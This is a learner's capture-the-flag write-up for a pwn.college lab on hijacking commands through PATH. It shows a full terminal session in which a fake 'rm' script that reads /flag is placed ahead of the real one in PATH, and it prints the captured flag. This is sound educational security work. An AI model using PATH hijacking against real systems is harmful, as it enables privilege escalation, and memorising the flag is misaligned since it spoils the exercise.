# Pondering PATH

## Hijacking Commands
Armed with your knowledge, you can now carry out some shenanigans.

### Objective
This challenge is almost the same as the first challenge in this module. Again, this challenge will delete the flag using the rm command. But unlike before, it will not print anything out for you.

How can you solve this? You know that rm is searched for in the directories listed in the PATH variable. You have experience creating the win command when the previous challenge needed it. What else can you create?

### Solve
**Flag:** `pwn.college{YoVr-wm6xi3XjaZ5AKleSNfbSWV.ddzNyUDLygjN0czW}`

- The first thing I tried to do was to create a script that I can use to cat the flag. So I created the win file with the `/run/dojo/bin/cat /flag` command in it. 
- Then just for checking, I tried to change the script written in the /challenge/run file but was unable to do so. So I just displayed its content.
- Then I displayed the PATH variable. In there, I removed all the paths present in it initially. Then I ran the /challenge/run command but did not get the flag since it was not accessing the flag itself and that meant I had to find a way to give the flag to it.
- So I tried to redirect the flag to it from the win file in different ways but none worked. 
- Then after multiple trial and errors, it clicked in my mind that it is executing the rm file. So just for checking, I identified the location of the rm file and then deleted it from the PATH. I repeated this process again a couple of times and it became clear that the `rm` file from the first available location was going to get executed.
- So I moved the win file to the rm file. Then added the `/home/hacker` path to the PATH variable. Then I again ran the `/challenge/run` command. This time I finally got the flag.

```bash
hacker@path~adding-commands:~$ touch win
hacker@path~adding-commands:~$ ls -l win
-rw-r--r-- 1 hacker hacker 0 Sep 27 11:01 win
hacker@path~adding-commands:~$ chmod a+x win
hacker@path~adding-commands:~$ ls -l win
-rwxr-xr-x 1 hacker hacker 0 Sep 27 11:01 win
hacker@path~hijacking-commands:~$ which cat
/run/dojo/bin/cat
hacker@path~adding-commands:~$ nano win
hacker@path~adding-commands:~$ cat win
#!/bin/bash

/run/dojo/bin/cat /flag
hacker@path~hijacking-commands:~$ nano /challenge/run
hacker@path~hijacking-commands:~$ cat /challenge/run
#!/opt/pwn.college/bash

/bin/fold -s <<< "Trying to remove /flag..."

RM=$(which rm 2>/dev/null)
[ -n "$RM" ] && echo "Found 'rm' command at $RM. Executing!"
rm -f /flag

if ! [ -f /flag ]
then
        /bin/fold -s <<< "Uh oh, looks like I successfully removed the flag! That means you did not properly set PATH to keep me from finding 'rm'. Since the flag is gone, you will need to re-launch the challenge from the module page! Better luck next time."
fi
hacker@path~hijacking-commands:~$ echo $PATH
/run/challenge/bin:/run/dojo/bin:/root/.cargo/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
hacker@path~hijacking-commands:~$ PATH=""
hacker@path~hijacking-commands:~$ /challenge/run << win
> ^C
hacker@path~hijacking-commands:~$ /challenge/run < win

Trying to remove /flag...
/challenge/run: line 7: rm: No such file or directory
hacker@path~hijacking-commands:~$ win > /challenge/run
bash: /challenge/run: Permission denied
hacker@path~hijacking-commands:~$ /challenge/run >(win)
cat: /flag: Permission denied
Trying to remove /flag...
/challenge/run: line 7: rm: No such file or directory
hacker@path~hijacking-commands:~$ export PATH="/run/challenge/bin:/run/dojo/bin:/root/.cargo/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
hacker@path~hijacking-commands:~$ which rm
/run/dojo/bin/rm
hacker@path~hijacking-commands:~$ export PATH="/run/challenge/bin:/root/.car
go/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
hacker@path~hijacking-commands:~$ which rm
/usr/bin/rm
hacker@path~hijacking-commands:~$ export PATH="/run/challenge/bin:/root/.cargo/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/sbin:/bin"
hacker@path~hijacking-commands:~$ which rm
/bin/rm
hacker@path~hijacking-commands:~$ mv win rm
hacker@path~hijacking-commands:~$ ls
Desktop  bin  flag  home-backup.tar.gz  rm
hacker@path~hijacking-commands:~$ export PATH=/home/hacker:$PATH
hacker@path~hijacking-commands:~$ which rm
/home/hacker/rm
hacker@path~hijacking-commands:~$ cat rm
#!/bin/bash

/run/dojo/bin/cat /flag
hacker@path~hijacking-commands:~$ /challenge/run
Trying to remove /flag...
Found 'rm' command at /home/hacker/rm. Executing!
pwn.college{YoVr-wm6xi3XjaZ5AKleSNfbSWV.ddzNyUDLygjN0czW}
```